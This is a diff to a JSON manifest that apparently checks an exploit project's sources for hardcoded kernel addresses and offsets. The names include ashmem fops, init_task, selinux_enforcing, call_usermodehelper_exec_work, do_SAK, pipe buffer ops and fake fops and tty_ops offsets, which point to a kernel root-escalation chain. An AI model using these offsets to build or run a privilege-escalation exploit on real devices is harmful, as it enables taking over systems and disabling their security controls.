@@ -11,16 +11,20 @@
     {"name": "real_ashmem_fops", "file": "src/00_orchestrator.c", "literal": "0x0200d4b8", "minimum": 1},
     {"name": "init_task", "file": "src/00_orchestrator.c", "literal": "0x02c05080", "minimum": 1},
     {"name": "selinux_enforcing", "file": "src/10_workqueue_umh_root.c", "literal": "0x02d8e5c0", "minimum": 1},
-    {"name": "system_unbound_wq", "file": "src/10_workqueue_umh_root.c", "literal": "0x02a90800", "minimum": 1},
     {"name": "call_usermodehelper_exec_work", "file": "src/10_workqueue_umh_root.c", "literal": "0x001045d0", "minimum": 1},
+    {"name": "do_SAK_work", "file": "src/10_workqueue_umh_root.c", "literal": "0x00bb5f14", "minimum": 1},
+    {"name": "do_SAK", "file": "src/10_workqueue_umh_root.c", "literal": "0x00bb8728", "minimum": 1},
+    {"name": "tty_SAK_work", "file": "src/10_workqueue_umh_root.c", "literal": "0x2f8", "minimum": 1},
+    {"name": "tty_ops_flush_buffer", "file": "src/10_workqueue_umh_root.c", "literal": "0xa8", "minimum": 1},
     {"name": "kmalloc_caches", "file": "src/09_pipe_buffer_rw.c", "literal": "0x02064478", "minimum": 1},
     {"name": "anon_pipe_buf_ops", "file": "src/09_pipe_buffer_rw.c", "literal": "0x01e7f460", "minimum": 1},
     {"name": "skb_send_size", "file": "src/09_pipe_buffer_rw.c", "literal": "0x8e80", "minimum": 1},
     {"name": "pipe_count", "file": "src/09_pipe_buffer_rw.c", "literal": "#define OSS_PIPE_COUNT 240", "minimum": 1},
     {"name": "pipe_slots", "file": "src/09_pipe_buffer_rw.c", "literal": "#define OSS_PIPE_SLOTS 32", "minimum": 1},
-    {"name": "fake_fops_offset", "file": "src/00_orchestrator.c", "literal": "0x1180", "minimum": 1},
-    {"name": "fake_work_offset", "file": "src/10_workqueue_umh_root.c", "literal": "0x6000", "minimum": 1},
+    {"name": "primary_fake_fops_offset", "file": "src/04_fake_kernel_objects.h", "literal": "0x1260", "minimum": 1},
+    {"name": "recovery_fake_fops_offset", "file": "src/04_fake_kernel_objects.h", "literal": "0x1660", "minimum": 1},
     {"name": "umh_data_offset", "file": "src/10_workqueue_umh_root.c", "literal": "0x6200", "minimum": 1},
+    {"name": "fake_tty_ops_offset", "file": "src/10_workqueue_umh_root.c", "literal": "0x6400", "minimum": 1},
     {"name": "pipe_proof_offset", "file": "src/09_pipe_buffer_rw.c", "literal": "0x7100", "minimum": 1}
   ]
 }
